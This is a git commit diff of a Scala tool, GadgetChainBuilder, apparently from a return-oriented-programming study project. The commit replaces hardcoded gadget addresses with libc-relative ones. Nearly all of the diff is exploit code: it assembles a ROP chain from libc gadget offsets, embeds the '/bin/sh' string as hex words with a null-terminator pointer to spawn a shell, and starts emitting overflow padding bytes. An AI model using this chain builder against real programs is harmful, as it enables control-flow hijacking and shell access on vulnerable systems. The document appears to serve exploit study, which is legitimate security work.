36feea11967b38e59afa847390d1f617965b400b
Peter Samuel <petersamuel@hotmail.co.uk>
2020-03-10 12:10:57 +0000

    Implemented Galileo Algorithm and Got Proper Gadgets Working
    Found the desired gadgets in the libc text section and used them instead of the ones explicitly inserted

--- src/main/scala/ROP/GadgetChainBuilder.scala
+++ src/main/scala/ROP/GadgetChainBuilder.scala
@@ -5,7 +5,6 @@ object GadgetChainBuilder {
 
   def main(args: Array[String]): Unit = {
     val filename: String = args(0)
-    // val outfile: String = args(1)
 
     val addresses = new Array[Long](8)
     val chain = new Array[Long](16)
@@ -16,22 +15,25 @@ object GadgetChainBuilder {
       i += 1;
     }
 
-    chain(0) = addresses(1)       // 0
-    chain(1) = addresses(2)       // 4
-    chain(2) = 185273099          // 8
-    chain(3) = addresses(0) + 28  // 12
-    chain(4) = addresses(3)       // 16
-    chain(5) = addresses(4)       // 20
-    chain(6) = addresses(5)       // 24
-    chain(7) = addresses(0) + 56  // 28
-    chain(8) = addresses(6)       // 32
-    chain(9) = addresses(0) + 48  // 36
-    chain(10) = addresses(0) + 52 // 40
-    chain(11) = addresses(7)      // 44
-    chain(12) = addresses(0) + 56 // 48
-    chain(13) = addresses(0) + 63 // 52 Points at 0 in /sh/0
-    chain(14) = 1852400175        // 56 "/bin"
-    chain(15) = 6845231           // 60 "/sh/0"
+    val chainStart = addresses(0)
+    val libcTextStart = addresses(1)
+
+    chain(0) = libcTextStart + addresses(2)       // 0
+    chain(1) = libcTextStart + addresses(3)       // 4
+    chain(2) = java.lang.Long.parseLong("0b0b0b0b", 16)
+    chain(3) = chainStart + 28  // 12
+    chain(4) = libcTextStart + addresses(4)       // 16
+    chain(5) = libcTextStart + addresses(5)       // 20
+    chain(6) = libcTextStart + addresses(6)       // 24
+    chain(7) = chainStart + 56  // 28
+    chain(8) = libcTextStart + addresses(3)       // 32
+    chain(9) = chainStart + 48  // 36
+    chain(10) = chainStart + 52 // 40
+    chain(11) = libcTextStart + addresses(7)      // 44
+    chain(12) = chainStart + 56 // 48
+    chain(13) = chainStart + 63 // 52 Points at 0 in /sh/0
+    chain(14) = java.lang.Long.parseLong("6e69622f", 16)        // 56 "/bin"
+    chain(15) = java.lang.Long.parseLong("68732f", 16)          // 60 "/sh/0"
 
     for (i <- 0 until 8)
       print(s"\\x42")
